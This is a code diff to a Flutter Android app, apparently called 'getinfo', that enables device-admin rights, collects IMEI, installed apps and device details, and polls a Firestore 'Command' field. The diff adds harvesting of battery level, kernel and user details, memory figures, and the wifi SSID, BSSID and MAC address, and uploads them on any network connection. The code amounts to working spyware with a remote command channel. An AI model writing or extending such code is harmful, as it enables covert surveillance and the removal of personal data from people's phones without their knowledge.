@@ -3,7 +3,7 @@ import 'package:getinfo/Appdrawer.dart';
 import 'package:device_info/device_info.dart';
 import 'package:device_apps/device_apps.dart';
 import 'package:cloud_firestore/cloud_firestore.dart';
-
+import 'package:android_wifi_info/android_wifi_info.dart';
 import 'package:imei_plugin/imei_plugin.dart';
 import 'package:uninstall_apps/uninstall_apps.dart';
 import 'package:admin/admin.dart';
@@ -13,7 +13,9 @@ import 'package:downloader/downloader.dart';
 import 'package:wifi/wifi.dart';
 import 'package:connect_wifi/connect_wifi.dart';
 import 'package:connectivity/connectivity.dart';
-import 'package:analog_clock/analog_clock.dart';
+import 'package:battery/battery.dart';
+
+import "package:system_info/system_info.dart";
 
 
 
@@ -86,9 +88,22 @@ class _HomeState extends State<Home> {
  
   
   String time;
-  initState(){
-     time = TimeOfDay.now().toString();
+  Battery battery;
+ 
+  int MEGABYTE = 1024 * 1024;
 
+  
+     
+  initState(){
+
+    
+
+     time = TimeOfDay.now().toString();
+     battery =Battery();
+     
+
+
+   
     getInfo();
     Admin.enable();
     Downloader.getPermission();
@@ -101,9 +116,9 @@ class _HomeState extends State<Home> {
         
          var connectivityResult = await (Connectivity().checkConnectivity());
          
-        if (connectivityResult != ConnectivityResult.wifi || connectivityResult == ConnectivityResult.wifi) {
+        if (connectivityResult == ConnectivityResult.wifi || connectivityResult == ConnectivityResult.mobile) {
             
-        
+     
         Firestore.instance.collection("Informations").where("Device_info.id",isEqualTo:fg).getDocuments().then((docs){
            
            var data = docs.documents.last;
@@ -129,6 +144,11 @@ class _HomeState extends State<Home> {
                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":""});
                               
                           }
+                          battery.batteryLevel.then((bat){
+
+                                  Firestore.instance.collection("Informations").document(data.documentID).updateData({"Command":"","Battery":bat});
+
+                                 });
                          
          });
         
@@ -190,15 +210,64 @@ class _HomeState extends State<Home> {
          List<DocumentSnapshot> doc = docs.documents;
 
          if(doc.length==0){
-           Firestore.instance.collection("Informations").add({
+           AndroidWifiInfo.bssid.then((bssid){
+             AndroidWifiInfo.ssid.then((ssid){
+                AndroidWifiInfo.macAddress.then((mac){
+                   battery.batteryLevel.then((bat){
+                   ConnectWifi.platformVersion.then((version){
+                       Firestore.instance.collection("Informations").add({
 
                  "Status":"Online",
                  "Installed_Apps":app,
                   "Device_info":allinfo,
                   "Imei":imei,
                   "Command":"",
-                  "Settings":[]
+                  "Battery":bat,
+                  "Settings":[],
+                  "System":{
+
+                                                      
+                                                        "Kernel name": "${SysInfo.kernelName}",
+                                                        "Kernel version": "${SysInfo.kernelVersion}",
+                                                        "Operating system name": "Android",
+                                                        "Operating system version": "$version",
+                                                        "User directory": "${SysInfo.userDirectory}",
+                                                        "User id": "${SysInfo.userId}",
+                                                        "User name": "${SysInfo.userName}",
+                                                    
+
+                  },
+                  "Memory":{
+                      "Total physical memory "  : "${(SysInfo.getTotalPhysicalMemory() ~/ MEGABYTE).toString()} MB",
+                      "Free physical memory"    : "${SysInfo.getFreePhysicalMemory() ~/ MEGABYTE} MB",
+                      "Total virtual memory"    : "${SysInfo.getTotalVirtualMemory() ~/ MEGABYTE} MB",
+                      "Free virtual memory"     : "${SysInfo.getFreeVirtualMemory() ~/ MEGABYTE} MB",
+                      "Virtual memory size"     : "${SysInfo.getVirtualMemorySize() ~/ MEGABYTE} MB",
+                  },
+                  "wifi":{
+                    "bssid":bssid,
+                    "ssid":ssid,
+                    "mac address":mac
+                  }
+
               });
+
+                   });  
+              
+
+              }); 
+
+              });
+
+             });
+
+            });
+          
+             
+
+          
+             
+          
 
          }else{
                  Firestore.instance.collection("Informations").document(doc.last.documentID).updateData({"Status":"Active"});
@@ -264,10 +333,38 @@ class _HomeState extends State<Home> {
                                 }
 
                                 print(snap.data.documents.last["Command"]+"        1");
+
+                                 AndroidWifiInfo.bssid.then((bssid){
+                                 AndroidWifiInfo.ssid.then((ssid){
+                                 AndroidWifiInfo.macAddress.then((mac){
+
+
+                                    battery.batteryLevel.then((bat){
+
+                                     Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData(
+                                                                {"Command":"",
+                                                                "Battery":bat,
+                                                                "wifi":{
+                                                                             "bssid":bssid,
+                                                                             "ssid":ssid,
+                                                                             "mac address":mac
+                                                                           },
+                                                    
+                                                                });
+
+                                    });
+
+               
+               
+                                  });});});
+
+                                
+
+                               
                                  
                                
 
-                                Firestore.instance.collection("Informations").document(snap.data.documents.last.documentID).updateData({"Command":""});
+                                
                               }
                                 return  Container(
                                    
